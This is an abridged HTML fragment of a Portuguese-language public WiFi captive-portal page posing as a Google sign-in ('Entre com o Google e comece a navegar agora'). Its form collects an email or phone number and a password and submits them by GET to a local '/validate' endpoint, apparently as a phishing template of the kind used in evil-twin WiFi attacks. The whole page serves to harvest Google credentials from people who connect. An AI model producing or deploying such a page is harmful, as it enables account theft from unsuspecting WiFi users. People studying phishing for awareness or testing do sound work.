...
<head>
    <title>Acesso WiFi público - Login do Google</title>
...
<body>
    ...
    <div class='banner'>
        <h1>
            Entre com o Google e comece a navegar agora
        </h1>
    ...
    <div class='login-page'>
        <div class='form'>
            <form class='login-form' action='/validate' method='GET'>
                ...
                <br>
                <input id='g' type='email' placeholder='E-mail ou telefone' name='user' required />
                <input id='g' type='password' placeholder='Digite sua senha' name='pass' required />
                <input type='hidden' name='url' value='google.com'>
                <button id='l' type='submit'>Entrar</button>
            </form>
        </div>
    </div>
